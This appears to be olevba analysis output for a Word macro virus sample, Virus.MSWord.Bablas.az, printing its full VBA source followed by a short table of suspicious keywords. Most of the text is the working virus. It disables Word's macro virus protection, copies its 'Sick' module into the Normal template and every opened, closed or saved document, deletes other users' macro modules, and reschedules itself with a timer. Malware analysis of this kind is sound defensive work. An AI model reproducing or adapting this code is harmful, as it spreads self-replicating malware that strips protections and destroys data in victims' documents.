olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.az
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.az - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sick.bas 
in file: Virus.MSWord.Bablas.az - OLE stream: 'Macros/VBA/Sick'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Trought()
Attribute Trought.VB_Description = "Macro created 10/02/99 by  Abdul Aziz"
Attribute Trought.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Cegat"
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    End Sub

Sub ViewVbCode()
    End Sub

Sub FileTemplates()
    End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "Microsoft World "
    End Sub
Sub Infect()
    Dim Ill As Boolean
    Ill = False
    
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "Sick" Then Ill = True
        If Obj.Name <> "Sick" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Ill = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="Sick", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub Infect2()
    Dim Thin As Boolean
    Thin = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "Sick" Then Thin = True
        If Obj.Name <> "Sick" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Thin = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Sick", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        Infect
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Trought
    ChangeCap
    Infect2
    On Error Resume Next
    NormalTemplate.Save
    End Sub

Sub AutoClose()
    Infect
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        Infect
        Infect2
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Broke()
    C = Documents.Count
    If C <> 0 Then
        Normal.Sick.Infect
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.Sick.Broke"
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Trought
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.Sick.Broke"
End Sub
Sub FormatStyle()
Dialogs(wdDialogFormatStyle).Show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |J'$                 |Sick                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

